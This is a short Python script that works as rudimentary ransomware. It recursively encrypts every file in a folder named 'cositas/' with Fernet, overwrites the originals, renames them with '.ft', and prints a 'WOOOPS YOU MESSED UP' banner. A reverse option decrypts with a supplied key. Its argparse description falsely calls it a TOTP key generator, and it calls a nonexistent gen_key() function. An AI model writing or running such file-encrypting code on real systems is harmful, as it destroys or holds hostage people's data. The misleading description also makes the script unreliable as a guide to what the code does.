from cryptography.fernet import Fernet
import sys
import argparse
import os
#cifrado simétrico AES (Advanced Encryption Standard)

parser = argparse.ArgumentParser(description='Generate TOTP key')

parser.add_argument('-r', '--reverse', type=str)
parser.add_argument('-k', '--genkey')
args = parser.parse_args()	

def genkey():
    my_key = Fernet.generate_key()
    with open('cif.key', 'wb') as keyfile:
        keyfile.write(my_key)

def encript_file(filename):
    key = open('cif.key', 'rb').read()
    cyphr = Fernet(key)
    try:
        with open(filename, 'rb') as text:
            or_data = text.read()
        enc_data = cyphr.encrypt(or_data)
        with open(filename, 'wb') as enc_file:
            enc_file.write(enc_data)
        os.rename(filename, filename + '.ft')
    except:
        pass
    
def unencript_file(name, key):
    if name.endswith('.ft'):
        cyphr = Fernet(key)
        with open(name, 'rb') as text:
            enc_data = text.read()
        or_data = cyphr.decrypt(enc_data)
        with open(name, 'wb') as or_file:
            or_file.write(or_data)
        os.rename(name, name[:len(name)-len('.ft')])

if args.genkey:
    gen_key()



dirpath = 'cositas/'
if args.reverse:
    print("Fixing everything...")
else:
    print("`. .´")
    print("-----")
    print("WOOOPS YOU MESSED UP")
    print("-----------------")
def getfiles(dirpath):
    filelist = os.listdir(dirpath)
    for file_n in filelist:
        totalname = dirpath + file_n
        if os.path.isdir(totalname):
            getfiles(totalname + '/')
        if args.reverse:
            unencript_file(totalname, args.reverse)
        else:
            if not os.path.isdir(totalname):
                print(totalname + " has been encripted")
            encript_file(totalname)

getfiles(dirpath)